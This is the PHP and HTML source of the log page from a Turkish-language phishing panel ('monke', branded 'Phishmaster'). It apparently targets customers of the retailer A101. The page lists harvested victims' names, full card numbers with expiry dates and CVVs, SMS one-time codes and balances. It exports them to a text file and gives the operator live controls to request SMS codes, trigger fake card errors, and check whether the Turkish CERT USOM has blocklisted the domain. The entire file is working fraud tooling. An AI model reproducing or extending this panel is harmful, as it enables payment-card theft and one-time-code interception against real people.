<?php include_once("../config.php"); include_once("./Data/Server/GrabIP.php"); include_once("./function/MainFunction.php"); giris_dogrulama($pdo);
  
  $dongu = $pdo->query('SELECT * FROM logs ORDER BY id DESC');
  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $QueryAdmin = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);

  if($QueryServer["ip_filter"] == 1) {
    if(!in_array($ip, $ip_filter_config)) {
      die("IP Firewall - monke");
    }
  } 

   if($_POST) {
    if(isset($_POST['download'])) {
      $tarih = date("d.m.Y H:i");
      header("Content-Disposition: attachment; filename=monke_a101_log \"$tarih\".txt");
      header("Content-Type: text/csv");

      echo "";
      echo " ".PHP_EOL;
      echo " ".PHP_EOL;
      echo "         ▬ Bütün loglar başarıyla TXT dosyasına kaydedildi. ▬         ".PHP_EOL;
      echo " ".PHP_EOL;
      echo " ".PHP_EOL;
      echo " ".PHP_EOL;
      echo "                   [KREDİ KARTI] - [SMS] - [BAKİYE] - [İP ADRESİ] - [TARİH] - [BANKA]                   ".PHP_EOL;
      echo "".PHP_EOL;

      $sorgu = $pdo->query("SELECT * FROM logs");
      $array = $sorgu->fetchAll(PDO::FETCH_ASSOC);

      foreach($array as $row) {

        if(empty($row['sms'])) {
          $degisken1 = "Girilmemiş";
        } else {
          $degisken1 = $row['sms'];
        }

        if(empty($row['isim_soyisim'])) {
          $degisken2 = "Girilmemiş";
        } else {
          $degisken2 = $row['isim_soyisim'];
        }
        
        if(empty($row['kredi_karti'])) {
          $degisken3 = "Girilmemiş";
        } else {
          $degisken3 = $row['kredi_karti']." ".$row['skt']." ".$row['cvv'];
        }

        if(empty($row['bakiye'])) {
          $degisken4 = "Girilmemiş";
        } else {
          $degisken4 = $row['bakiye'];
        }

        if(empty($row['banka'])) {
          $degisken5 = "Girilmemiş";
        } else {
          $degisken5 = $row['banka']." (".$row['seviye'].") ";
        }

        echo "".PHP_EOL;
        echo "•      ".$degisken2." | ";
        echo $degisken3." | ";
        echo $degisken1." | ";
        echo $degisken4." | ";
        echo $row['ip']." | ";
        echo $row['tarih']." | ";
        echo $degisken5;
      }
    
      exit;
    } else if(isset($_POST['truncate'])) {
      $pdo->query("TRUNCATE TABLE logs");
      $pdo->query("TRUNCATE TABLE logs_visitor");
      $pdo->query("TRUNCATE TABLE cevrimici_tablosu");
      header("Location: logs");
      exit;
    } else if(isset($_POST['sepetlerisil'])) {
      $pdo->query("TRUNCATE TABLE sepet"); 
      header("Location: logs");
      exit;
    }
   }
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>monke - Log Tablosu</title>
    <meta name="description" content="monke Panel">
    <meta name="author" content="monke">
    <meta name="robots" content="noindex, nofollow">
    
    <meta property="og:title" content="monke Panel">
    <meta property="og:site_name" content="Developed monke">
    <meta property="og:description" content="monke Panel">
    <meta property="og:type" content="website">

    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <script>
      $(document).ready(function() {
        setInterval(function() {
          $("#tablo").load(window.location.href + " #tablo");
        }, 3000);
        setInterval(function() {
          $("#sepetsayi").load(window.location.href + " #sepetsayi");
        }, 3000);
        setInterval(function() {
          $("#cevrimicisayi").load(window.location.href + " #cevrimicisayi");
        }, 3000);
      });
    </script>
  </head>
  <body>
    <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
      <nav id="sidebar" aria-label="Main Navigation">
        <div class="content-header">
          <a class="fw-semibold text-dual" href="main">
            <span class="smini-visible">
              <i class="fa-solid fa-crosshairs text-primary"></i>
            </span>
            <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
          </a>
          <div>
            <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
              <i class="fa fa-moon"></i>
            </button>
            <div class="dropdown d-inline-block ms-1">
              <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
                <i class="fa fa-brush"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                  <span>Varsayılan</span>
                  <i class="fa fa-circle text-default"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                  <span>Stil 1</span>
                  <i class="fa fa-circle text-amethyst"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                  <span>Stil 2</span>
                  <i class="fa fa-circle text-city"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                  <span>Stil 3</span>
                  <i class="fa fa-circle text-flat"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                  <span>Stil 4</span>
                  <i class="fa fa-circle text-modern"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                  <span>Stil 5</span>
                  <i class="fa fa-circle text-smooth"></i>
                </button>
              </div>
            </div>
            <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
              <i class="fa fa-fw fa-times"></i>
            </a>
          </div>
        </div>
        <div class="js-sidebar-scroll">
          <div class="content-side">
            <ul class="nav-main">
              <li class="nav-main-item">
                <a class="nav-main-link" href="main">
                  <i class="nav-main-link-icon si si-speedometer"></i>
                  <span class="nav-main-link-name">Anasayfa</span>
                </a>
              </li>
              <li class="nav-main-heading">PHISHING</li>
              <li class="nav-main-item">
                <a class="nav-main-link active" href="logs">
                  <i class="nav-main-link-icon si si-credit-card"></i>
                  <span class="nav-main-link-name">Log Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="bans">
                  <i class="nav-main-link-icon si si-ban"></i>
                  <span class="nav-main-link-name">Ban Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="banks">
                  <i class="nav-main-link-icon fa fa-bank"></i>
                  <span class="nav-main-link-name">Banka Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="urunler">
                  <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                  <span class="nav-main-link-name">Ürün Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="address">
                  <i class="nav-main-link-icon fa fa-map"></i>
                  <span class="nav-main-link-name">Adres Tablosu</span>
                </a>
              </li>
              <li class="nav-main-heading">ARACLAR</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                  <i class="nav-main-link-icon fa fa-check-double"></i>
                  <span class="nav-main-link-name">USOM Kontrolü</span>
                </a>
              </li>
              <?php if($QueryAdmin['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
              <?php endif; ?>
            </ul>
          </div>
        </div>
      </nav>
      <header id="page-header">
        <div class="content-header">
          <div class="d-flex align-items-center">
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
              <i class="fa fa-fw fa-bars"></i>
            </button>
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
              <i class="fa fa-fw fa-ellipsis-v"></i>
            </button>
          </div>
          <div class="d-flex align-items-center">
            <div class="dropdown d-inline-block ms-2">
              <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">  
                <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryAdmin['kullanici_adi']; ?></span>
                <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
                <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                  <p class="mt-2 mb-0 fw-medium"><?php echo $QueryAdmin['kullanici_adi']; ?></p>
                  <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryAdmin['yetki']; ?></p>
                </div>
                <div class="p-2">
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                    <span class="fs-sm fw-medium">Ayarlar</span>
                  </a>
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                    <span class="fs-sm fw-medium">Çıkış Yap</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>
      <main id="main-container">
        <div class="bg-body-light">
          <div class="content content-full">
            <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
              <div class="flex-grow-1">
                <h1 class="h3 fw-bold mb-2"> Log Tablosu </h1>
                <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                  <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>, bu sayfa sayesinde düşen sazanları görebilirsin.
                </h2>
                
              </div>
              <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
                <ol class="breadcrumb breadcrumb-alt">
                  <li class="breadcrumb-item">
                    <a class="link-fx" href="javascript:void(0)">Phishing</a>
                  </li>
                  <li class="breadcrumb-item" aria-current="page"> Log Tablosu </li>
                </ol>
              </nav>
            </div>
            [ <span id="sepetsayi">Toplam Sepet: <?= $sepet_sayisi; ?> </span> | <span id="cevrimicisayi">Toplam Çevrimiçi: <?php $onlineList = []; $query = $pdo->query("SELECT * FROM cevrimici_tablosu", PDO::FETCH_ASSOC); if($query->rowCount()) {foreach($query as $v) {if($v['onlineTimer'] > time()) {array_push($onlineList, $v['ip']);}}}echo count($onlineList); ?></span> ]
          </div>
        </div>
        <div class="content">
          <div class="block block-rounded">
            <div class="block-content">
              <?php if($log_sayisi <= 0): ?>
                <span id="tablo" class="justify-content-center text-center m-auto"> <p>Veri Girişi Bekleniyor...</p></span>
              <?php else : ?>
              <div class="table-responsive" id="tablo">
                <center>
                  <div>
                    <div class="btn-group btn-group-sm" role="group">
                      <form method="POST"> <button type="submit" id="truncate" name="truncate" class="btn btn-primary btn-sm"><i class="fa-solid fa-trash"></i> Tümünü Sil</button> </form>&nbsp&nbsp
                      <form method="POST"> <button type="submit" id="download" name="download" class="btn btn-primary btn-sm"><i class="fa-solid fa-download"></i> Tümünü İndir</button> </form>&nbsp&nbsp
                      <form method="POST"> <button type="submit" id="sepetlerisil" name="sepetlerisil" class="btn btn-primary btn-sm"><i class="fa-solid fa-trash"></i> Tüm Sepetleri Sil</button> </form>
                    </div>
                  </div>
                  
                </center>
                <br>  
                <table class="table table-hover table-vcenter">
                  <thead>
                    <tr>
                      <th style="width: 0.1%;"></th>
                      <th class="text-center fw-light fs-sm" style="width: 2%;"><i class="fa-regular fa-eye"></i> DURUM</th>
                      <th class="text-center fw-light fs-sm" style="width: 3%;"><i class="fa-solid fa-user"></i> İSİM SOYİSİM</th>
                      <th class="text-center fw-light fs-sm" style="width: 10%;"><i class="fa-solid fa-closed-captioning"></i> KREDI KARTI</th>
                      <th class="text-center fw-light fs-sm" style="width: 1%;"><i class="fa-solid fa-comment-sms"></i> SMS</th>
                      <th class="text-center fw-light fs-sm" style="width: 5%;"><i class="fa-solid fa-money-bill"></i> BAKIYE</th>
                      <th class="text-center fw-light fs-sm" style="width: 6%;"><i class="fa-regular fa-calendar-days"></i> TARIH</th>
                      <!-- <th class="text-center fw-light fs-sm" style="width: 7%;"><i class="fa-regular fa-map"></i> ADRES BILGISI</th> -->
                      <th style="width: 2%;"></th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php foreach($dongu as $yazdir) { ?>
                    <tr>
                       <td class="text-center fw-semibold fs-sm"><?php if($yazdir['onlineTimer'] > time()) { echo '<a target="_blank" href="https://ip-api.com/'.$yazdir["ip"].'" class="fa-solid fa-wifi" style="color: green; text-shadow: darkgreen 0px 0px 10px;"></a>'; } else { echo ' <a target="_blank" href="https://ip-api.com/'.$yazdir["ip"].'" class="fa-solid fa-wifi" style="color: #cc2121; text-shadow: darkred 0px 0px 10px;"></a>'; } ?></td>
                      <td class="text-center fw-semibold fs-sm">
                        <span class="badge bg-primary"><?php echo htmlspecialchars($yazdir['durum']); ?></span>
                      </td>
                      <td class="text-center fw-normal fs-sm"><?php if($yazdir['isim_soyisim']): ?><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo $yazdir['isim_soyisim']; ?>"><?php echo $yazdir['isim_soyisim']; ?></a><?php endif; ?></td>
                      <td class="text-center fw-normal fs-sm"><?php if($yazdir['kredi_karti']): ?><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo $yazdir['kredi_karti']; ?>" title="<?php echo 'Banka: '.htmlspecialchars($yazdir['banka']).''.PHP_EOL.'Seviye: '.htmlspecialchars($yazdir['seviye']); ?>"><?php echo $yazdir['kredi_karti']; ?>  <?php echo $yazdir['skt']; ?>  <?php echo $yazdir['cvv']; ?>
						  <br></a><span style="color:#54ff9f; text-shadow: 0px 0px 10px #54ff9f;"><?php echo htmlspecialchars($yazdir['banka']).' | '.PHP_EOL.htmlspecialchars($yazdir['seviye']); ?></span><?php endif; ?></td>
                      <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($yazdir['sms']); ?>"><?php echo htmlspecialchars($yazdir['sms']); ?></a></td>
                      <td class="text-center fw-normal fs-sm"><?php echo htmlspecialchars($yazdir['bakiye']); ?></td>
                      <td class="text-center fw-normal fs-sm"><?php echo htmlspecialchars($yazdir['tarih']); ?><br><?php echo ZamaniFormatla($yazdir['tarih']); ?></td>
                      <!-- <td class="text-center fw-normal fs-sm"><button type="button" class="btn btn-sm btn-success text-center fw-semibold fs-sm" onclick="adresGoster('<?php //echo htmlspecialchars($yazdir['ip']);?>')">Göster</button></td> -->
                      <td>
                        <button type="button" class="btn btn-alt-primary btn-sm" onclick="hesapislemleri('<?php echo $yazdir['ip'];?>')" data-bs-toggle="modal" data-bs-target="#modal-block-vcenter">İşlemler</button>
                      </td>
                    </tr>
                    <?php } ?>
                  </tbody>
                </table>
              </div>
              <?php endif; ?>
            </div>
          </div>
        </div>
      </main>
      <footer id="page-footer" class="bg-body-light">
        <div class="content py-3">
          <div class="row fs-sm">
            <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>
            </div>
            <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
              <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
    <script type="text/javascript">
      var clipboard = new ClipboardJS('.Kopyala');
      clipboard.on('success', function (e) {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Panoya kopyalama işlemi başarılı!'});
      });
      clipboard.on('error', function (e) {
        One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: 'Panoya kopyalama işlemi başarısız!'});
      });

      document.getElementById("check_usom").addEventListener("click", function(e) {
        var domain = window.location.host;

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'USOM kontrolü yapılıyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/CheckUsom.php",
          data: {
            domain: domain
          },
          success: function (data) {
            if(data === "yasaklandi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Domain USOM tarafından yasaklanmış durumda."});
            } else if(data === "yasaklanmadi") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Domain USOM tarafından yasaklanmadı."});
            } else if(data === "baglanti hatasi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "USOM ile bağlantı kurulamadı!"});
            }
          }
        });
      });

      function adresGoster(ip) {
        $.ajax({
          type: "POST",
          url: "./function/AdresGetir.php",
          data: {
            ip: ip
          },
          success: function (data) {
            var bilgi = JSON.parse(data);
            Swal.fire({
              title: 'Adres Bilgileri',
              html: `
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>İsim: `+bilgi.isim+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Soyisim: `+bilgi.soyisim+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Telefon Numarası: `+bilgi.telefon+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>E-Posta Adresi: `+bilgi.eposta+` </span> <br>
                <hr>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>İl: `+bilgi.il+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>İlçe: `+bilgi.ilce+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Mahalle: `+bilgi.mahalle+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Cadde: `+bilgi.cadde+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Bina: `+bilgi.bina+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Kat: `+bilgi.kat+` </span> <br>
                <span style='color: #fff; background-color: #7c58dba8; background-image: linear-gradient(to right, #7c58db, #2db8cb); padding: 0px 4px; font-size: 25px; text-transform: uppercase; border-radius: 1px;'>Daire: `+bilgi.daire+` </span>
              `,
              icon: 'success',
              confirmButtonColor: '#3085d6',
              confirmButtonText: 'Tamam'
            })
          }
        })
      }

      document.getElementById("factory_reset").addEventListener("click", function(e) {
        Swal.fire({
          title: 'Emin misin?',
          text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Evet',
          cancelButtonText: 'Hayır'
        }).then((result) => {
          if (result.isConfirmed) {
            e.preventDefault();
            $.ajax({
              type: "POST",
              url: "./function/FactoryReset.php",
              data: {
                izin: true
              },
              success: function (data) {
                Swal.fire({
                  title: 'İşlem Başarılı!',
                  text: "Bütün veriler başarıyla silindi.",
                  icon: 'success',
                  confirmButtonColor: '#3085d6',
                  confirmButtonText: 'Tamam'
                }).then((result) => {
                  if (result.isConfirmed) {
                    window.location.href = 'quit';
                  }
                })
              }
            });
          }
        })
      });
		function islem(islem, ip) {
			if(islem == "adres") {
				adresGoster(ip)
			} else {
				$.ajax({
          type: "POST",
          url: "./function/islem.php",
          data: {
            islem: islem,
            ip: ip,
          },
          success: function (data) {

            if(data == "bin_zaten_yasakli") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "Sazanın bini zaten yasaklı!"});
            } else if(data == "banka_zaten_yasakli") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "Sazanın bankası zaten yasaklı!"});
            } else {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "İşlem Başarılı!"});
            }
            
          }
        });
			}
        
      }
		function hesapislemleri(ip) {
          Swal.fire({
            title: ip,
            html: `
              <h4>Ana İşlemler</h4>
              <button type="button" onclick="islem('basa_dondur','`+ip+`')" class="btn btn-sm btn-primary text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Başa Döndür</button>
              <button type="button" onclick="islem('tebrikler','`+ip+`')" class="btn btn-sm btn-success text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Tebrikler</button>
			  <button type="button" onclick="islem('adres','`+ip+`')" class="btn btn-sm btn-success text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Adres Bilgisi</button>
              <hr>
              <h4>SMS İşlemleri</h4>
			  <button type="button" onclick="islem('dogrulama','`+ip+`')" class="btn btn-sm btn-primary text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Doğrulama İste</button>
			  <button type="button" onclick="islem('hata_dogrulama','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Doğrulama Geçersiz</button>
			  <br><br>
              <button type="button" onclick="islem('sms','`+ip+`')" class="btn btn-sm btn-primary text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> SMS İste</button>
              <button type="button" onclick="islem('tebrikler','`+ip+`')" class="btn btn-sm btn-success text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> SMS Onaylandı</button>
              <button type="button" onclick="islem('hata_sms','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> SMS Geçersiz</button>
              <hr>
              <h4>Hata İşlemleri</h4>
              <button type="button" onclick="islem('hata_limit','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Limit Hatası</button>
              <button type="button" onclick="islem('hata_internet','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> İnternet Alışv. Kapalı Hatası</button>
			  <br><br>
			  <button type="button" onclick="islem('hata_skt','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> SKT Hatası</button>
			  <button type="button" onclick="islem('hata_cvv','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> CVV Hatası</button>
              <hr>
              <h4>BIN İşlemleri</h4>
              <button type="button" onclick="islem('bin_banla','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> BIN Yasakla</button>
              <button type="button" onclick="islem('banka_banla','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Banka Yasakla</button>
              <hr>
              <h4>Diğer İşlemler</h4>
              <button type="button" onclick="islem('yasakla','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Yasakla</button>
              <button type="button" onclick="islem('sil','`+ip+`')" class="btn btn-sm btn-danger text-center fw-semibold fs-sm" id="dropdown-align-primary" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Sil</button>
            `,
            showConfirmButton: false
          })
        }
      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };

      setInterval(function() {
         SoundControl()
       }, 3000);

      function SoundControl() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "./function/SoundController.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        xhr.onreadystatechange = function () {
          if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            if (xhr.responseText === "log") {
              if ("Notification" in window) {
                Notification.requestPermission().then(function (permission) {
                  if (permission === "granted") {
                    var notification = new Notification("monke | Log Bildirimi", {
                      body: "Panele log geldi!",
                    });
                    var audio = new Audio('./assets/media/sound/monke_log.mp3');
                    audio.play();
                  } else if (permission === "denied") {
                    One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Bildirim isteği reddedildi."});
                  }
                });
              }
            } else if(xhr.responseText === "sms") {
              Notification.requestPermission().then(function (permission) {
                if (permission === "granted") {
                  var notification = new Notification("monke | SMS Bildirimi", {
                    body: "Birisi SMS girdi.",
                  });
                  var audio = new Audio('./assets/media/sound/monke_sms.mp3');
                  audio.play();
                } else if (permission === "denied") {
                  One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Bildirim isteği reddedildi."});
                }
              });
            }
          }
        };

        xhr.send();
      }
    </script>
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
  </body>
</html>